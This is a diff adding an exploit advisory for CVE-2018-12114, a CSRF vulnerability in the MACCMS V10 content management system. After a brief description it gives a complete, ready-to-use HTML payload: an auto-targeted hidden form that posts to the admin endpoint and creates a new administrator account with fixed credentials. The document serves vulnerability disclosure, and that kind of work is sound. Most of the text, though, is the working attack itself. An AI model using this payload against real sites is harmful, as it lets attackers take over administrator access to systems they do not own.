@@ -1,0 +1,28 @@
+# Exploit Title: MACCMS_V10 CSRF vulnerability add admin account
+# Date: 2018-06-11 
+# Exploit Author: bay0net
+# Vendor Homepage: https://www.cnblogs.com/v1vvwv/p/9168309.html
+# Software Link: http://www.maccms.com/down.html
+# Version: V10
+# CVE : CVE-2018-12114
+
+
+I found a CSRF vulnerability in maccms_v10,this vulnerability can be arbitrarily added to users.
+
+
+The payload for attack is as follows.
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://10.211.55.17/maccms10/admin.php/admin/admin/info.html" method="POST">
+      <input type="hidden" name="admin_id" value="" />
+      <input type="hidden" name="admin_name" value="test2" />
+      <input type="hidden" name="admin_pwd" value="test2" />
+      <input type="hidden" name="admin_status" value="1" />
+      <input type="hidden" name="admin_auth[0]" value="index/welcome" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
